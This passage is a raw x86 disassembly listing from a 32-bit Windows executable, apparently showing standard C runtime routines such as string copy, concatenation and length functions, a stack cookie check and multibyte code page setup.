  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
  4258a6:	mov    BYTE PTR [edi],al
  4258a8:	add    edi,0x1
  4258ab:	sub    ecx,0x1
  4258ae:	je     0x42594c
  4258b4:	test   edi,0x3
  4258ba:	jne    0x4258a6
  4258bc:	mov    ebx,ecx
  4258be:	shr    ecx,0x2
  4258c1:	jne    0x425937
  4258c3:	mov    BYTE PTR [edi],al
  4258c5:	add    edi,0x1
  4258c8:	sub    ebx,0x1
  4258cb:	jne    0x4258c3
  4258cd:	pop    ebx
  4258ce:	pop    esi
  4258cf:	mov    eax,DWORD PTR [esp+0x8]
  4258d3:	pop    edi
  4258d4:	ret    
  4258d5:	mov    DWORD PTR [edi],edx
  4258d7:	add    edi,0x4
  4258da:	sub    ecx,0x1
  4258dd:	je     0x42587e
  4258df:	mov    edx,0x7efefeff
  4258e4:	mov    eax,DWORD PTR [esi]
  4258e6:	add    edx,eax
  4258e8:	xor    eax,0xffffffff
  4258eb:	xor    eax,edx
  4258ed:	mov    edx,DWORD PTR [esi]
  4258ef:	add    esi,0x4
  4258f2:	test   eax,0x81010100
  4258f7:	je     0x4258d5
  4258f9:	test   dl,dl
  4258fb:	je     0x425929
  4258fd:	test   dh,dh
  4258ff:	je     0x42591f
  425901:	test   edx,0xff0000
  425907:	je     0x425915
  425909:	test   edx,0xff000000
  42590f:	jne    0x4258d5
  425911:	mov    DWORD PTR [edi],edx
  425913:	jmp    0x42592d
  425915:	and    edx,0xffff
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	jmp    0x42592d
  42591f:	and    edx,0xff
  425925:	mov    DWORD PTR [edi],edx
  425927:	jmp    0x42592d
  425929:	xor    edx,edx
  42592b:	mov    DWORD PTR [edi],edx
  42592d:	add    edi,0x4
  425930:	xor    eax,eax
  425932:	sub    ecx,0x1
  425935:	je     0x425943
  425937:	xor    eax,eax
  425939:	mov    DWORD PTR [edi],eax
  42593b:	add    edi,0x4
  42593e:	sub    ecx,0x1
  425941:	jne    0x425939
  425943:	and    ebx,0x3
  425946:	jne    0x4258c3
  42594c:	mov    eax,DWORD PTR [esp+0x10]
  425950:	pop    ebx
  425951:	pop    esi
  425952:	pop    edi
  425953:	ret    
  425954:	int3   
  425955:	int3   
  425956:	int3   
  425957:	int3   
  425958:	int3   
  425959:	int3   
  42595a:	int3   
  42595b:	int3   
  42595c:	int3   
  42595d:	int3   
  42595e:	int3   
  42595f:	int3   
  425960:	mov    ecx,DWORD PTR [esp+0x4]
  425964:	test   ecx,0x3
  42596a:	je     0x425990
  42596c:	mov    al,BYTE PTR [ecx]
  42596e:	add    ecx,0x1
  425971:	test   al,al
  425973:	je     0x4259c3
  425975:	test   ecx,0x3
  42597b:	jne    0x42596c
  42597d:	add    eax,0x0
  425982:	lea    esp,[esp+0x0]
  425989:	lea    esp,[esp+0x0]
  425990:	mov    eax,DWORD PTR [ecx]
  425992:	mov    edx,0x7efefeff
  425997:	add    edx,eax
  425999:	xor    eax,0xffffffff
  42599c:	xor    eax,edx
  42599e:	add    ecx,0x4
  4259a1:	test   eax,0x81010100
  4259a6:	je     0x425990
  4259a8:	mov    eax,DWORD PTR [ecx-0x4]
  4259ab:	test   al,al
  4259ad:	je     0x4259e1
  4259af:	test   ah,ah
  4259b1:	je     0x4259d7
  4259b3:	test   eax,0xff0000
  4259b8:	je     0x4259cd
  4259ba:	test   eax,0xff000000
  4259bf:	je     0x4259c3
  4259c1:	jmp    0x425990
  4259c3:	lea    eax,[ecx-0x1]
  4259c6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ca:	sub    eax,ecx
  4259cc:	ret    
  4259cd:	lea    eax,[ecx-0x2]
  4259d0:	mov    ecx,DWORD PTR [esp+0x4]
  4259d4:	sub    eax,ecx
  4259d6:	ret    
  4259d7:	lea    eax,[ecx-0x3]
  4259da:	mov    ecx,DWORD PTR [esp+0x4]
  4259de:	sub    eax,ecx
  4259e0:	ret    
  4259e1:	lea    eax,[ecx-0x4]
  4259e4:	mov    ecx,DWORD PTR [esp+0x4]
  4259e8:	sub    eax,ecx
  4259ea:	ret    
  4259eb:	push   0x8
  4259ed:	push   0x429658
  4259f2:	call   0x425350
  4259f7:	and    DWORD PTR [ebp-0x4],0x0
  4259fb:	push   0x0
  4259fd:	push   0x1
  4259ff:	call   0x427572
  425a04:	pop    ecx
  425a05:	pop    ecx
  425a06:	jmp    0x425a0f
  425a08:	xor    eax,eax
  425a0a:	inc    eax
  425a0b:	ret    
  425a0c:	mov    esp,DWORD PTR [ebp-0x18]
  425a0f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a13:	push   0x3
  425a15:	call   DWORD PTR ds:0x42905c
  425a1b:	int3   
  425a1c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a22:	jne    0x425a25
  425a24:	ret    
  425a25:	jmp    0x4259eb
  425a2a:	movzx  eax,BYTE PTR [esp+0x4]
  425a2f:	mov    cl,BYTE PTR [esp+0xc]
  425a33:	test   BYTE PTR [eax+0x45df21],cl
  425a39:	jne    0x425a57
  425a3b:	cmp    DWORD PTR [esp+0x8],0x0
  425a40:	je     0x425a50
  425a42:	movzx  eax,WORD PTR [eax*2+0x429a52]
  425a4a:	and    eax,DWORD PTR [esp+0x8]
  425a4e:	jmp    0x425a52
  425a50:	xor    eax,eax
  425a52:	test   eax,eax
  425a54:	jne    0x425a57
  425a56:	ret    
  425a57:	xor    eax,eax
  425a59:	inc    eax
  425a5a:	ret    
  425a5b:	push   0x4
  425a5d:	push   0x0
  425a5f:	push   DWORD PTR [esp+0xc]
  425a63:	call   0x425a2a
  425a68:	add    esp,0xc
  425a6b:	ret    
  425a6c:	sub    eax,0x3a4
  425a71:	je     0x425a95
  425a73:	sub    eax,0x4
  425a76:	je     0x425a8f
  425a78:	sub    eax,0xd
  425a7b:	je     0x425a89
  425a7d:	dec    eax
  425a7e:	je     0x425a83
  425a80:	xor    eax,eax
  425a82:	ret    
  425a83:	mov    eax,0x404
  425a88:	ret    
  425a89:	mov    eax,0x412
  425a8e:	ret    
  425a8f:	mov    eax,0x804
  425a94:	ret    
  425a95:	mov    eax,0x411
  425a9a:	ret    
  425a9b:	push   edi
  425a9c:	push   0x40
  425a9e:	xor    eax,eax
  425aa0:	pop    ecx
  425aa1:	mov    edi,0x45df20
  425aa6:	rep stos DWORD PTR es:[edi],eax
  425aa8:	stos   BYTE PTR es:[edi],al
  425aa9:	xor    eax,eax
  425aab:	mov    ds:0x45e024,eax
  425ab0:	mov    ds:0x45df1c,eax
  425ab5:	mov    ds:0x45df14,eax
  425aba:	mov    edi,0x45e030
  425abf:	stos   DWORD PTR es:[edi],eax
  425ac0:	stos   DWORD PTR es:[edi],eax
  425ac1:	stos   DWORD PTR es:[edi],eax
  425ac2:	pop    edi
  425ac3:	ret    
  425ac4:	push   ebp
  425ac5:	mov    ebp,esp
  425ac7:	sub    esp,0x518
  425acd:	mov    eax,ds:0x45d430
  425ad2:	xor    eax,DWORD PTR [ebp+0x4]
  425ad5:	push   esi
  425ad6:	mov    DWORD PTR [ebp-0x4],eax
  425ad9:	lea    eax,[ebp-0x18]
  425adc:	push   eax
  425add:	push   DWORD PTR ds:0x45e024
  425ae3:	call   DWORD PTR ds:0x4290c8
  425ae9:	cmp    eax,0x1
  425aec:	mov    esi,0x100
  425af1:	jne    0x425c04
  425af7:	xor    eax,eax
  425af9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425b00:	inc    eax
  425b01:	cmp    eax,esi
  425b03:	jb     0x425af9
  425b05:	mov    al,BYTE PTR [ebp-0x12]
  425b08:	test   al,al
  425b0a:	mov    BYTE PTR [ebp-0x118],0x20
  425b11:	je     0x425b49
  425b13:	push   ebx
  425b14:	lea    edx,[ebp-0x11]
  425b17:	push   edi
  425b18:	movzx  ecx,BYTE PTR [edx]
  425b1b:	movzx  eax,al
  425b1e:	cmp    eax,ecx
  425b20:	ja     0x425b3f
  425b22:	sub    ecx,eax
  425b24:	inc    ecx
  425b25:	mov    ebx,ecx
  425b27:	shr    ecx,0x2
  425b2a:	lea    edi,[ebp+eax*1-0x118]
  425b31:	mov    eax,0x20202020
  425b36:	rep stos DWORD PTR es:[edi],eax
  425b38:	mov    ecx,ebx
  425b3a:	and    ecx,0x3
  425b3d:	rep stos BYTE PTR es:[edi],al
  425b3f:	inc    edx
  425b40:	mov    al,BYTE PTR [edx]
  425b42:	inc    edx
  425b43:	test   al,al
  425b45:	jne    0x425b18
  425b47:	pop    edi
  425b48:	pop    ebx
  425b49:	push   0x0
  425b4b:	push   DWORD PTR ds:0x45df14
  425b51:	lea    eax,[ebp-0x518]
  425b57:	push   DWORD PTR ds:0x45e024
  425b5d:	push   eax
  425b5e:	push   esi
  425b5f:	lea    eax,[ebp-0x118]
  425b65:	push   eax
  425b66:	push   0x1
  425b68:	call   0x427a78
  425b6d:	push   0x0
  425b6f:	push   DWORD PTR ds:0x45e024
  425b75:	lea    eax,[ebp-0x218]
  425b7b:	push   esi
  425b7c:	push   eax
  425b7d:	push   esi
  425b7e:	lea    eax,[ebp-0x118]
  425b84:	push   eax
  425b85:	push   esi
  425b86:	push   DWORD PTR ds:0x45df14
  425b8c:	call   0x4276bc
  425b91:	push   0x0
  425b93:	push   DWORD PTR ds:0x45e024
  425b99:	lea    eax,[ebp-0x318]
  425b9f:	push   esi
  425ba0:	push   eax
  425ba1:	push   esi
  425ba2:	lea    eax,[ebp-0x118]
  425ba8:	push   eax
  425ba9:	push   0x200
  425bae:	push   DWORD PTR ds:0x45df14
  425bb4:	call   0x4276bc
  425bb9:	add    esp,0x5c
  425bbc:	xor    eax,eax
  425bbe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bc6:	test   cl,0x1
  425bc9:	je     0x425be1
  425bcb:	or     BYTE PTR [eax+0x45df21],0x10
  425bd2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bd9:	mov    BYTE PTR [eax+0x45e040],cl
  425bdf:	jmp    0x425bfd
  425be1:	test   cl,0x2
  425be4:	je     0x425bf6
  425be6:	or     BYTE PTR [eax+0x45df21],0x20
  425bed:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425bf4:	jmp    0x425bd9
  425bf6:	and    BYTE PTR [eax+0x45e040],0x0
  425bfd:	inc    eax
  425bfe:	cmp    eax,esi
  425c00:	jb     0x425bbe
  425c02:	jmp    0x425c48
  425c04:	xor    eax,eax
  425c06:	cmp    eax,0x41
  425c09:	jb     0x425c24
  425c0b:	cmp    eax,0x5a
  425c0e:	ja     0x425c24
  425c10:	or     BYTE PTR [eax+0x45df21],0x10
  425c17:	mov    cl,al
  425c19:	add    cl,0x20
  425c1c:	mov    BYTE PTR [eax+0x45e040],cl
  425c22:	jmp    0x425c43
  425c24:	cmp    eax,0x61
  425c27:	jb     0x425c3c
  425c29:	cmp    eax,0x7a
  425c2c:	ja     0x425c3c
  425c2e:	or     BYTE PTR [eax+0x45df21],0x20
  425c35:	mov    cl,al
  425c37:	sub    cl,0x20
  425c3a:	jmp    0x425c1c
  425c3c:	and    BYTE PTR [eax+0x45e040],0x0
  425c43:	inc    eax
  425c44:	cmp    eax,esi
  425c46:	jb     0x425c06
  425c48:	mov    ecx,DWORD PTR [ebp-0x4]
  425c4b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c4e:	pop    esi
  425c4f:	call   0x425a1c
  425c54:	leave  
  425c55:	ret    
  425c56:	push   ebp
  425c57:	mov    ebp,esp
  425c59:	sub    esp,0x1c
  425c5c:	mov    eax,ds:0x45d430
  425c61:	xor    eax,DWORD PTR [ebp+0x4]
  425c64:	push   ebx
  425c65:	push   esi
  425c66:	mov    esi,DWORD PTR [ebp+0x8]
  425c69:	xor    ebx,ebx
  425c6b:	cmp    esi,ebx
  425c6d:	mov    DWORD PTR [ebp-0x4],eax
  425c70:	push   edi
  425c71:	je     0x425dcb
  425c77:	xor    edx,edx
  425c79:	xor    eax,eax
  425c7b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c81:	je     0x425ce8
  425c83:	add    eax,0x30
  425c86:	inc    edx
  425c87:	cmp    eax,0xf0
  425c8c:	jb     0x425c7b
  425c8e:	lea    eax,[ebp-0x1c]
  425c91:	push   eax
  425c92:	push   esi
  425c93:	call   DWORD PTR ds:0x4290c8
  425c99:	cmp    eax,0x1
  425c9c:	jne    0x425dc3
  425ca2:	push   0x40
  425ca4:	xor    eax,eax
  425ca6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425caa:	pop    ecx
  425cab:	mov    edi,0x45df20
  425cb0:	rep stos DWORD PTR es:[edi],eax
  425cb2:	stos   BYTE PTR es:[edi],al
  425cb3:	mov    DWORD PTR ds:0x45e024,esi
  425cb9:	mov    DWORD PTR ds:0x45df14,ebx
  425cbf:	jbe    0x425db1
  425cc5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cc9:	je     0x425d89
  425ccf:	lea    ecx,[ebp-0x15]
  425cd2:	mov    dl,BYTE PTR [ecx]
  425cd4:	test   dl,dl
  425cd6:	je     0x425d89
  425cdc:	movzx  eax,BYTE PTR [ecx-0x1]
  425ce0:	movzx  edx,dl
  425ce3:	jmp    0x425d79
  425ce8:	push   0x40
  425cea:	xor    eax,eax
  425cec:	pop    ecx
  425ced:	mov    edi,0x45df20
  425cf2:	rep stos DWORD PTR es:[edi],eax
  425cf4:	lea    ecx,[edx+edx*2]
  425cf7:	shl    ecx,0x4
  425cfa:	mov    DWORD PTR [ebp-0x8],ebx
  425cfd:	stos   BYTE PTR es:[edi],al
  425cfe:	lea    ebx,[ecx+0x45d450]
  425d04:	mov    al,BYTE PTR [ebx]
  425d06:	mov    esi,ebx
  425d08:	jmp    0x425d33
  425d0a:	mov    dl,BYTE PTR [esi+0x1]
  425d0d:	test   dl,dl
  425d0f:	je     0x425d37
  425d11:	movzx  eax,al
  425d14:	movzx  edi,dl
  425d17:	cmp    eax,edi
  425d19:	ja     0x425d2f
  425d1b:	mov    edx,DWORD PTR [ebp-0x8]
  425d1e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d24:	or     BYTE PTR [eax+0x45df21],dl
  425d2a:	inc    eax
  425d2b:	cmp    eax,edi
  425d2d:	jbe    0x425d24
  425d2f:	inc    esi
  425d30:	inc    esi
  425d31:	mov    al,BYTE PTR [esi]
  425d33:	test   al,al
  425d35:	jne    0x425d0a
  425d37:	inc    DWORD PTR [ebp-0x8]
  425d3a:	add    ebx,0x8
  425d3d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d41:	jb     0x425d04
  425d43:	mov    eax,DWORD PTR [ebp+0x8]
  425d46:	mov    ds:0x45e024,eax
  425d4b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d55:	call   0x425a6c
  425d5a:	lea    ecx,[ecx+0x45d444]
  425d60:	mov    esi,ecx
  425d62:	mov    edi,0x45e030
  425d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d69:	mov    ds:0x45df14,eax
  425d6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d6f:	jmp    0x425dd0
  425d71:	or     BYTE PTR [eax+0x45df21],0x4
  425d78:	inc    eax
  425d79:	cmp    eax,edx
  425d7b:	jbe    0x425d71
  425d7d:	inc    ecx
  425d7e:	inc    ecx
  425d7f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d83:	jne    0x425cd2
  425d89:	xor    ecx,ecx
  425d8b:	inc    ecx
  425d8c:	mov    eax,ecx
  425d8e:	or     BYTE PTR [eax+0x45df21],0x8
  425d95:	inc    eax
  425d96:	cmp    eax,0xff
  425d9b:	jb     0x425d8e
  425d9d:	mov    eax,esi
  425d9f:	call   0x425a6c
  425da4:	mov    ds:0x45df14,eax
  425da9:	mov    DWORD PTR ds:0x45df1c,ecx
  425daf:	jmp    0x425db7
  425db1:	mov    DWORD PTR ds:0x45df1c,ebx
  425db7:	xor    eax,eax
  425db9:	mov    edi,0x45e030
  425dbe:	stos   DWORD PTR es:[edi],eax
  425dbf:	stos   DWORD PTR es:[edi],eax
  425dc0:	stos   DWORD PTR es:[edi],eax
  425dc1:	jmp    0x425dd0
  425dc3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425dc9:	je     0x425dd9
  425dcb:	call   0x425a9b
  425dd0:	call   0x425ac4
  425dd5:	xor    eax,eax
  425dd7:	jmp    0x425ddc
  425dd9:	or     eax,0xffffffff
  425ddc:	mov    ecx,DWORD PTR [ebp-0x4]
  425ddf:	xor    ecx,DWORD PTR [ebp+0x4]
  425de2:	pop    edi
  425de3:	pop    esi
  425de4:	pop    ebx
  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
